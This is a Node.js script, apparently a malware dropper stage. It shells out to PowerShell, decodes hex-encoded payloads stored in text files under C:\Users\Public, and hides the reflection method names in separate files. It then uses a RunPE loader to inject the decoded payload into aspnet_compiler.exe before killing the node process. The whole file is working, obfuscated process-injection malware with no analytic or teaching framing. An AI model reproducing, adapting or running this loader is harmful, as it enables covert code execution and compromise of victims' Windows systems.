var exec = require("child_process").exec;
var src = "" +

"function fromHex { param([string] $str)" +
"$hex = $str -split ' '; $result = New-Object 'byte[]' ($hex.Count / 2);" +
"$count = 0; foreach ($value in $hex) {" +
"    if ($value -match '^0x') {" +
"        $result[$count] = [byte]('0x' + $value.Substring(2));" +
"        $count++;" +
"    } elseif ($value -match '^0x[a-fA-F0-9]{2}$') {" +
"        $result[$count] = [byte]$value;" +
"        $count++;" +
"    } elseif ($value -match '^\(0x[a-fA-F0-9]{2}\)$') {" +
"        $result[$count] = [byte]($value.Substring(1, $value.Length - 2));" +
"        $count++;" +
"    }" +
"}" +
"return $result };" +

"$msg = (Get-Content -Path 'C:\\Users\\Public\\msg.txt');" +
"$runpe = (Get-Content -Path 'C:\\Users\\Public\\runpe.txt');" +
"$result = fromHex $msg;" +
"$runpeD = fromHex $runpe;" +
"$new = (Get-Content -Path 'C:\\Users\\Public\\NewPE2.txt');" +
"$Execute = (Get-Content -Path 'C:\\Users\\Public\\Execute.txt');" +
"$Invoke = (Get-Content -Path 'C:\\Users\\Public\\Invoke.txt');" +
"$load = (Get-Content -Path 'C:\\Users\\Public\\load.txt');" +
"$ype = (Get-Content -Path 'C:\\Users\\Public\\Gettype.txt');" +
"$getM = (Get-Content -Path 'C:\\Users\\Public\\getMethod.txt');";

var command = "[Reflection.Assembly]::$load([Byte[]]$runpeD).$ype($new).$getM($Execute).$Invoke($null,[Object[]]('C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe',$null,[Byte[]]$result,$true)); Stop-Process -Name 'node'";
src += command; 

exec("powershell.exe -Command \"" + src + "\"", function(err, stdout, stderr) {
    if(err) {
        return;
    }
});